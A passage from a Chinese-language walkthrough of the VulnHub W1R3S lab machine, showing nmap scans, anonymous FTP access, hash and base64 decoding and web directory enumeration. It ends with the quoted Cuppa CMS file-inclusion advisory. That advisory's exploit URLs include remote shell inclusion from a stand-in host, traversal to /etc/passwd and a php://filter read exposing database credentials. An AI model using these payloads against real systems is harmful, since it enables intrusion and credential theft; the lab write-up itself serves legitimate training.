closed port</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.9 (97%), Linux 5.1 (94%), Linux 4.10 (93%), Linux 3.4 - 3.10 (93%), Linux 3.10 (93%), Linux 3.13 - 3.16 (92%), Linux 4.4 (92%), Synology DiskStation Manager 5.2-5644 (92%), Linux 3.16 - 4.6 (91%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.51 seconds</span><br></pre></td></tr></table></figure>
<h4 id="UDP扫描">UDP扫描</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ sudo nmap -sU --top-ports 20 192.168.152.132 </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 23:18 EDT</span><br><span class="line">Nmap scan report for 192.168.152.132</span><br><span class="line">Host is up (0.00050s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line">53/udp    open|filtered domain</span><br><span class="line">67/udp    open|filtered dhcps</span><br><span class="line">68/udp    open|filtered dhcpc</span><br><span class="line">69/udp    open|filtered tftp</span><br><span class="line">123/udp   open|filtered ntp</span><br><span class="line">135/udp   open|filtered msrpc</span><br><span class="line">137/udp   open|filtered netbios-ns</span><br><span class="line">138/udp   open|filtered netbios-dgm</span><br><span class="line">139/udp   open|filtered netbios-ssn</span><br><span class="line">161/udp   open|filtered snmp</span><br><span class="line">162/udp   open|filtered snmptrap</span><br><span class="line">445/udp   open|filtered microsoft-ds</span><br><span class="line">500/udp   open|filtered isakmp</span><br><span class="line">514/udp   open|filtered syslog</span><br><span class="line">520/udp   open|filtered route</span><br><span class="line">631/udp   open|filtered ipp</span><br><span class="line">1434/udp  open|filtered ms-sql-m</span><br><span class="line">1900/udp  open|filtered upnp</span><br><span class="line">4500/udp  open|filtered nat-t-ike</span><br><span class="line">49152/udp open|filtered unknown</span><br><span class="line">MAC Address: 00:0C:29:60:2F:0A (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds                                                                  </span><br></pre></td></tr></table></figure>
<h4 id="vuln脚本扫描">vuln脚本扫描</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ sudo nmap -script=vuln -p21,22,80,3306 192.168.152.132</span><br><span class="line">Nmap scan report for 192.168.152.132</span><br><span class="line">Host is up (0.00039s latency).</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /wordpress/wp-login.php: Wordpress login page.</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server&#x27;s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">MAC Address: 00:0C:29:60:2F:0A (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 321.65 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>必要时尝试IPV6</p>
<h2 id="FTP渗透">FTP渗透</h2>
<h3 id="匿名登录">匿名登录</h3>
<p>在信息搜集的过程中，nmap扫描到ftp开放，可以使用匿名登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br></pre></td></tr></table></figure>
<p>用户名就为Anonymous，密码为空</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ftp 192.168.152.132</span><br><span class="line">Connected to 192.168.152.132.</span><br><span class="line">220 Welcome to W1R3S.inc FTP service.</span><br><span class="line">Name (192.168.152.132:kali): Anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>
<p>选择切换binary模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp&gt; binary</span><br><span class="line">200 Switching to Binary mode.</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong></p>
<p>不进行切换到binary模式，下载的可执行文件可能损坏</p>
<h3 id="信息泄露">信息泄露</h3>
<h4 id="content">content</h4>
<p>进入content文件查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||45116|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cd content</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||45048|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 ftp      ftp            29 Jan 23  2018 01.txt</span><br><span class="line">-rw-r--r--    1 ftp      ftp           165 Jan 23  2018 02.txt</span><br><span class="line">-rw-r--r--    1 ftp      ftp           582 Jan 23  2018 03.txt</span><br><span class="line">226 Directory send OK.</span><br></pre></td></tr></table></figure>
<p>对查看的文件进行下载操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp&gt; mget *.txt</span><br><span class="line">mget 01.txt [anpqy?]? y</span><br><span class="line">229 Entering Extended Passive Mode (|||46201|)</span><br><span class="line">150 Opening BINARY mode data connection for 01.txt (29 bytes).</span><br><span class="line">100% |*************************************************************|    29       35.17 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">29 bytes received in 00:00 (18.66 KiB/s)</span><br><span class="line">mget 02.txt [anpqy?]? y</span><br><span class="line">229 Entering Extended Passive Mode (|||44162|)</span><br><span class="line">150 Opening BINARY mode data connection for 02.txt (165 bytes).</span><br><span class="line">100% |*************************************************************|   165      254.55 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">165 bytes received in 00:00 (117.27 KiB/s)</span><br><span class="line">mget 03.txt [anpqy?]? y</span><br><span class="line">229 Entering Extended Passive Mode (|||49788|)</span><br><span class="line">150 Opening BINARY mode data connection for 03.txt (582 bytes).</span><br><span class="line">100% |*************************************************************|   582      888.06 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">582 bytes received in 00:00 (435.52 KiB/s)</span><br></pre></td></tr></table></figure>
<p><strong>小技巧</strong></p>
<p>避免交互式确认</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp&gt; prompt</span><br><span class="line">Interactive mode off.</span><br></pre></td></tr></table></figure>
<h4 id="docs">docs</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp&gt; cd ..</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||47572|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cd docs</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||43184|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 ftp      ftp           138 Jan 23  2018 worktodo.txt</span><br><span class="line">226 Directory send OK.</span><br></pre></td></tr></table></figure>
<h4 id="new-employees">new-employees</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp&gt; cd new-employees</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||43732|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 ftp      ftp           155 Jan 28  2018 employee-names.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; get employee-names.txt</span><br><span class="line">local: employee-names.txt remote: employee-names.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||45279|)</span><br><span class="line">150 Opening BINARY mode data connection for employee-names.txt (155 bytes).</span><br><span class="line">100% |*************************************************************|   155      137.35 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">155 bytes received in 00:00 (82.13 KiB/s)</span><br></pre></td></tr></table></figure>
<p>所有内容查看并下载完毕，可以退出ftp</p>
<h3 id="整理破解">整理破解</h3>
<p>先查看数字文本中的信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ cat *.txt  </span><br><span class="line">New FTP Server For W1R3S.inc</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">01ec2d8fc11c493b25029fb1f47f39ce</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==</span><br><span class="line">############################################</span><br><span class="line">___________.__              __      __  ______________________   _________    .__               </span><br><span class="line">\__    ___/|  |__   ____   /  \    /  \/_   \______   \_____  \ /   _____/    |__| ____   ____  </span><br><span class="line">  |    |   |  |  \_/ __ \  \   \/\/   / |   ||       _/ _(__  &lt; \_____  \     |  |/    \_/ ___\ </span><br><span class="line">  |    |   |   Y  \  ___/   \        /  |   ||    |   \/       \/        \    |  |   |  \  \___ </span><br><span class="line">  |____|   |___|  /\___  &gt;   \__/\  /   |___||____|_  /______  /_______  / /\ |__|___|  /\___  &gt;</span><br><span class="line">                \/     \/         \/                \/       \/        \/  \/         \/     \/ </span><br><span class="line">The W1R3S.inc employee list</span><br><span class="line"></span><br><span class="line">Naomi.W - Manager</span><br><span class="line">Hector.A - IT Dept</span><br><span class="line">Joseph.G - Web Design</span><br><span class="line">Albert.O - Web Design</span><br><span class="line">Gina.L - Inventory</span><br><span class="line">Rico.D - Human Resources</span><br><span class="line"></span><br><span class="line">        ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡</span><br><span class="line"></span><br><span class="line">....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ</span><br></pre></td></tr></table></figure>
<p>可以看到存在两个密码</p>
<p>有一段结尾为==，很明显可能与base64有关，尝试解密</p>
<p><img src="https://s2.loli.net/2024/03/11/dkV2C3g7URAlPxL.png" alt="vulnhub-w1r3s-2"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">It is easy, but not that easy..</span><br></pre></td></tr></table></figure>
<p>还有一段尝试识别</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ hash-identifier                                                       </span><br><span class="line">   #########################################################################</span><br><span class="line">   #     __  __                     __           ______    _____           #</span><br><span class="line">   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span><br><span class="line">   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span><br><span class="line">   #     \ \  _  \  /&#x27;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span><br><span class="line">   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span><br><span class="line">   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span><br><span class="line">   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span><br><span class="line">   #                                                             By Zion3R #</span><br><span class="line">   #                                                    www.Blackploit.com #</span><br><span class="line">   #                                                   Root@Blackploit.com #</span><br><span class="line">   #########################################################################</span><br><span class="line">--------------------------------------------------</span><br><span class="line"> HASH: 01ec2d8fc11c493b25029fb1f47f39ce</span><br><span class="line"></span><br><span class="line">Possible Hashs:</span><br><span class="line">[+] MD5</span><br><span class="line">[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))</span><br><span class="line"></span><br><span class="line">Least Possible Hashs:</span><br><span class="line">[+] RAdmin v2.x</span><br><span class="line">[+] NTLM</span><br><span class="line">[+] MD4</span><br><span class="line">[+] MD2</span><br><span class="line">[+] MD5(HMAC)</span><br><span class="line">[+] MD4(HMAC)</span><br><span class="line">[+] MD2(HMAC)</span><br><span class="line">[+] MD5(HMAC(Wordpress))</span><br><span class="line">[+] Haval-128</span><br><span class="line">[+] Haval-128(HMAC)</span><br><span class="line">[+] RipeMD-128</span><br><span class="line">[+] RipeMD-128(HMAC)</span><br><span class="line">[+] SNEFRU-128</span><br><span class="line">[+] SNEFRU-128(HMAC)</span><br><span class="line">[+] Tiger-128</span><br><span class="line">[+] Tiger-128(HMAC)</span><br><span class="line">[+] md5($pass.$salt)</span><br><span class="line">[+] md5($salt.$pass)</span><br><span class="line">[+] md5($salt.$pass.$salt)</span><br><span class="line">[+] md5($salt.$pass.$username)</span><br><span class="line">[+] md5($salt.md5($pass))</span><br><span class="line">[+] md5($salt.md5($pass))</span><br><span class="line">[+] md5($salt.md5($pass.$salt))</span><br><span class="line">[+] md5($salt.md5($pass.$salt))</span><br><span class="line">[+] md5($salt.md5($salt.$pass))</span><br><span class="line">[+] md5($salt.md5(md5($pass).$salt))</span><br><span class="line">[+] md5($username.0.$pass)</span><br><span class="line">[+] md5($username.LF.$pass)</span><br><span class="line">[+] md5($username.md5($pass).$salt)</span><br><span class="line">[+] md5(md5($pass))</span><br><span class="line">[+] md5(md5($pass).$salt)</span><br><span class="line">[+] md5(md5($pass).md5($salt))</span><br><span class="line">[+] md5(md5($salt).$pass)</span><br><span class="line">[+] md5(md5($salt).md5($pass))</span><br><span class="line">[+] md5(md5($username.$pass).$salt)</span><br><span class="line">[+] md5(md5(md5($pass)))</span><br><span class="line">[+] md5(md5(md5(md5($pass))))</span><br><span class="line">[+] md5(md5(md5(md5(md5($pass)))))</span><br><span class="line">[+] md5(sha1($pass))</span><br><span class="line">[+] md5(sha1(md5($pass)))</span><br><span class="line">[+] md5(sha1(md5(sha1($pass))))</span><br><span class="line">[+] md5(strtoupper(md5($pass)))</span><br><span class="line">--------------------------------------------------</span><br></pre></td></tr></table></figure>
<p>尝试md5解密</p>
<p><img src="https://s2.loli.net/2024/03/11/6TQdeiPYsD4KLVh.png" alt="vulnhub-w1r3s-1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is not a password</span><br></pre></td></tr></table></figure>
<p>除两端疑似密文外，但是没有得到什么有价值的信息</p>
<p>可以看到还存在相关的员工列表，通过相关的搜集可能获得部分更高权限，得到相关的立足点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The W1R3S.inc employee list</span><br><span class="line"></span><br><span class="line">Naomi.W - Manager</span><br><span class="line">Hector.A - IT Dept</span><br><span class="line">Joseph.G - Web Design</span><br><span class="line">Albert.O - Web Design</span><br><span class="line">Gina.L - Inventory</span><br><span class="line">Rico.D - Human Resources</span><br></pre></td></tr></table></figure>
<p>然后是一段明显是颠倒的信息，通过在线网站</p>
<p><a href="https://www.upsidedowntext.com/">Upside Down Text | Flip Text, Type Upside Down, or Backwards Text</a></p>
<p><img src="https://s2.loli.net/2024/03/11/QfnGSkTIADLysR3.png" alt="vulnhub-w1r3s-3"></p>
<p><img src="https://s2.loli.net/2024/03/11/zb9tBA3Plvj5Qio.png" alt="vulnhub-w1r3s-4"></p>
<h2 id="MySQL">MySQL</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ mysql -h 192.168.152.132 -u root -p</span><br><span class="line">Enter password: </span><br><span class="line">ERROR 1130 (HY000): Host &#x27;192.168.152.131&#x27; is not allowed to connect to this MySQL server</span><br></pre></td></tr></table></figure>
<p>尝试空密码，但是很明显失败了</p>
<h2 id="Web渗透">Web渗透</h2>
<p>当然，还有一个80端口，存在着web服务，是值得去尝试的</p>
<p>打开后是一个基本的ubuntu服务器的页面</p>
<p><img src="https://s2.loli.net/2024/03/11/BIfNnmwtHxF3PAj.png" alt="vulnhub-w1r3s-5"></p>
<p>进行目录爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ dirsearch -u http://192.168.152.132:80/                                      </span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3                                                         </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                      </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/桌面/reports/http_192.168.152.132_80/__24-03-11_01-27-32.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.152.132/</span><br><span class="line"></span><br><span class="line">[01:27:32] Starting:                                                                                    </span><br><span class="line">[01:27:33] 403 -  301B  - /.ht_wsr.txt                                      </span><br><span class="line">[01:27:33] 403 -  304B  - /.htaccess.bak1                                   </span><br><span class="line">[01:27:33] 403 -  304B  - /.htaccess.orig                                   </span><br><span class="line">[01:27:33] 403 -  304B  - /.htaccess.save</span><br><span class="line">[01:27:33] 403 -  304B  - /.htaccess_orig                                   </span><br><span class="line">[01:27:33] 403 -  302B  - /.htaccessBAK</span><br><span class="line">[01:27:33] 403 -  302B  - /.htaccessOLD</span><br><span class="line">[01:27:33] 403 -  306B  - /.htaccess.sample                                 </span><br><span class="line">[01:27:33] 403 -  305B  - /.htaccess_extra</span><br><span class="line">[01:27:33] 403 -  302B  - /.htaccess_sc                                     </span><br><span class="line">[01:27:33] 403 -  295B  - /.html</span><br><span class="line">[01:27:33] 403 -  294B  - /.htm</span><br><span class="line">[01:27:33] 403 -  303B  - /.htaccessOLD2</span><br><span class="line">[01:27:33] 403 -  301B  - /.httr-oauth                                      </span><br><span class="line">[01:27:33] 403 -  300B  - /.htpasswds</span><br><span class="line">[01:27:33] 403 -  304B  - /.htpasswd_test                                   </span><br><span class="line">[01:27:34] 403 -  294B  - /.php                                             </span><br><span class="line">[01:27:34] 403 -  295B  - /.php3                                            </span><br><span class="line">[01:27:40] 301 -  326B  - /administrator  -&gt;  http://192.168.152.132/administrator/</span><br><span class="line">[01:27:40] 302 -    7KB - /administrator/  -&gt;  installation/                </span><br><span class="line">[01:27:40] 302 -    7KB - /administrator/index.php  -&gt;  installation/       </span><br><span class="line">[01:27:51] 301 -  323B  - /javascript  -&gt;  http://192.168.152.132/javascript/</span><br><span class="line">[01:28:01] 403 -  304B  - /server-status/                                   </span><br><span class="line">[01:28:01] 403 -  303B  - /server-status                                    </span><br><span class="line">[01:28:09] 200 -    1KB - /wordpress/wp-login.php                           </span><br><span class="line">[01:28:09] 301 -    0B  - /wordpress/  -&gt;  http://localhost/wordpress/   </span><br></pre></td></tr></table></figure>
<p>通过扫描明显看出存在wordpress和administrator的后台目录</p>
<p>因此下面也就是两个方向</p>
<h3 id="administrator">administrator</h3>
<p>进入后发现应该是一个系统配置界面</p>
<p><img src="https://s2.loli.net/2024/03/11/yi4JbWmM6exZXgF.png" alt="vulnhub-w1r3s-6"></p>
<p><img src="https://s2.loli.net/2024/03/11/47wUDMTedrtXcqK.png" alt="vulnhub-w1r3s-8"></p>
<p><strong>注意</strong></p>
<p>这里也存在一个问题，就是由于这个是一个靶机，所以对于相关操作没有太大心理压力，但是如果是真实环境，就可能担心会对系统及服务造成不可逆的损失，或者出现暴露，牢记，所有的测试要保证自身安全的情况下进行！</p>
<p><img src="https://s2.loli.net/2024/03/11/6lcTVkOa5qyUL29.png" alt="vulnhub-w1r3s-7"></p>
<p>无法对管理员进行新的创建，因此考虑查找其他方向</p>
<h4 id="漏洞利用">漏洞利用</h4>
<p>查找相关漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ searchsploit cuppa cms                                </span><br><span class="line">---------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                        |  Path</span><br><span class="line">---------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion       | php/webapps/25971.txt</span><br><span class="line">---------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
<p>将相关exp信息进行下载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ searchsploit cuppa -m 25971</span><br><span class="line">[!] Could not find EDB-ID #</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  Exploit: Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/25971</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt</span><br><span class="line">    Codes: OSVDB-94101</span><br><span class="line"> Verified: True</span><br><span class="line">File Type: C++ source, ASCII text, with very long lines (876)</span><br><span class="line">Copied to: /home/kali/桌面/25971.txt</span><br></pre></td></tr></table></figure>
<p>查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Exploit Title   : Cuppa CMS File Inclusion</span><br><span class="line"># Date            : 4 June 2013</span><br><span class="line"># Exploit Author  : CWH Underground</span><br><span class="line"># Site            : www.2600.in.th</span><br><span class="line"># Vendor Homepage : http://www.cuppacms.com/</span><br><span class="line"># Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip</span><br><span class="line"># Version         : Beta</span><br><span class="line"># Tested on       : Window and Linux</span><br><span class="line"></span><br><span class="line">  ,--^----------,--------,-----,-------^--,</span><br><span class="line">  | |||||||||   `--------&#x27;     |          O .. CWH Underground Hacking Team ..</span><br><span class="line">  `+---------------------------^----------|</span><br><span class="line">    `\_,-------, _________________________|</span><br><span class="line">      / XXXXXX /`|     /</span><br><span class="line">     / XXXXXX /  `\   /</span><br><span class="line">    / XXXXXX /\______(</span><br><span class="line">   / XXXXXX /</span><br><span class="line">  / XXXXXX /</span><br><span class="line"> (________(</span><br><span class="line">  `------&#x27;</span><br><span class="line"></span><br><span class="line">####################################</span><br><span class="line">VULNERABILITY: PHP CODE INJECTION</span><br><span class="line">####################################</span><br><span class="line"></span><br><span class="line">/alerts/alertConfigField.php (LINE: 22)</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">LINE 22:</span><br><span class="line">        &lt;?php include($_REQUEST[&quot;urlConfig&quot;]); ?&gt;</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#####################################################</span><br><span class="line">DESCRIPTION</span><br><span class="line">#####################################################</span><br><span class="line"></span><br><span class="line">An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.</span><br><span class="line"></span><br><span class="line">http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]</span><br><span class="line"></span><br><span class="line">#####################################################</span><br><span class="line">EXPLOIT</span><br><span class="line">#####################################################</span><br><span class="line"></span><br><span class="line">http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?</span><br><span class="line">http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</span><br><span class="line"></span><br><span class="line">Moreover, We could access Configuration.php source code via PHPStream</span><br><span class="line"></span><br><span class="line">For Example:</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Base64 Encode Output:</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Base64 Decode Output:</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">&lt;?php</span><br><span class="line">	class Configuration&#123;</span><br><span class="line">		public $host = &quot;localhost&quot;;</span><br><span class="line">		public $db = &quot;cuppa&quot;;</span><br><span class="line">		public $user = &quot;root&quot;;</span><br><span class="line">		public $password = &quot;Db@dmin&quot;;</span><br><span class="line">		public $table_prefix = &quot;cu_&quot;;</span><br><span class="line">		public $administrator_template = &quot;default&quot;;</span><br><span class="line">		public $list_limit = 25;</span><br><span class="line">		public $token = &quot;OBqIPqlFWf3X&quot;;</span><br><span class="line">		public $allowed_extensions = &quot;*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx&quot;;</span><br><span class="line">		public $upload_default_path = &quot;media/uploadsFiles&quot;;</span><br><span class="line">		public $maximum_file_size = &quot;5242880&quot;;</span><br><span class="line">		public $secure_login = 0;</span><br><span class="line">		public $secure_login_value = &quot;&quot;;</span><br><span class="line">		public $secure_login_redirect = &quot;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Able to read sensitive information via File Inclusion (PHP Stream)</span><br><span class="line"></span><br><span class="line">################################################################################################################</span><br><span class="line"> Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2</span><br><span class="line">################################################################################################################</span><br></pre></td></tr></table></figure>
<p>随后，在根据上述信息，查看/etc/passwd</p>
